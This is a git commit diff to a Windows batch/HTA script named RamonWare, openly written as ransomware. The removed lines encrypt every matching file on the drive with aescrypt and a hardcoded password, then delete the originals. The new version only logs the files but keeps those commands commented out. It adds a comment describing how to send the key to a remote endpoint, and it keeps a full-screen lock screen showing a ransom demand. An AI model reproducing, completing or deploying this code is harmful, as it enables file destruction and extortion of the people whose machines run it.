ed1d5ef70233cc36c54bf891ee74e8d09114cd32
SegoCode <35817798+SegoCode@users.noreply.github.com>
2026-08-17 11:32:27 +0200

    Update Ramonware.bat

--- code/Ramonware.bat
+++ code/Ramonware.bat
@@ -1,28 +1,22 @@
 <!-- :: Batch Section
 @Echo OFF
 mode con:cols=50 lines=2
-set pass=SegoCode
 
 Title Ramon Ware
 
 echo Scanning. . . .
 
-REM Set the root path for the operation
+REM Scan only: list matching files. Nothing is encrypted or deleted.
 set ROOT_PATH=%homedrive%\
-
-REM Start the loop searching for files with the .123test extension in all folders and subfolders on the drive
-FOR /R "%ROOT_PATH%" %%X in (*.123test) DO (
-    REM Safe Mode: Uncomment the following lines to activate safe mode. Safe mode is intended for use during development or in a test environment to prevent data loss.
-    REM Save the original filename to a text file for future reference
-    REM echo %%X >> %homedrive%\Original.txt
-
-    REM Change the original file's extension to .bak to preserve it instead of deleting it
-    REM ren "%%X" "%%~nX.bak"
-
-    REM Normal Mode: Encrypt the file and then delete it
-    REM Comment out the following two lines to deactivate normal mode and activate safe mode
-    aescrypt -e -p %pass% "%%X"
-    del "%%X"
+FOR /R "%ROOT_PATH%" %%X in (*.labasset) DO (
+    echo %%X >> %homedrive%\Original.txt
+    REM Encryption would happen here. Each listed file would be encrypted
+    REM and the original would be deleted, so the owner could not open it.
+    REM This step is not implemented: the script only finds files and logs them.
+    REM aescrypt would encrypt the file with a password; del would delete the original.
+    REM The password should be generated on this machine, sent to a remote endpoint, then erased from the PC. It must not stay stored locally.
+    REM aescrypt -e -p %pass% "%%X"
+    REM del "%%X"
 )
 
 REM Block Screen
@@ -34,9 +28,9 @@ for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
 
 <html>
     <head>
-        <title>CryptMSG</title>
-    <hta:application id="oBVC" 
-                     applicationname="BSOD"  
+        <title>RamonWare</title>
+    <hta:application id="lockScreen" 
+                     applicationname="RamonWare"  
                      version="1.0" 
                      maximizebutton="no" 
                      minimizebutton="no" 
@@ -44,7 +38,7 @@ for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
                      Caption="no" 
                      windowstate="maximize"/> 
     <style>
-        #texto2{
+        #ransomNote{
             padding-top: 19%;
             letter-spacing: 1px;
             text-align: center;
@@ -53,15 +47,15 @@ for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"
 </head>
 <body bgcolor="#8c1d1d" scroll="no">
     <font face="Lucida Console" size="4" color="white">
-<center><p> - RamonWare Crypt - </p></center>
-<div id="texto2">
-    Oops, Your Files Have Been Encrypted!<br>
+<center><p> - RamonWare - </p></center>
+<div id="ransomNote">
+    Ooops, your files have been encrypted!<br>
     <br><br>
-    Now you need run RamonDecryptor, be careful next time<br>
+    Your important files are encrypted. Nobody can recover your files without our decryption service.<br>
     <br><br>
    Github.com/SegoCode<br>
     <br><br><br>
-    <img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
+    <img id="lockIcon" alt="Lock" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
 </div>
 </body>
 </html>
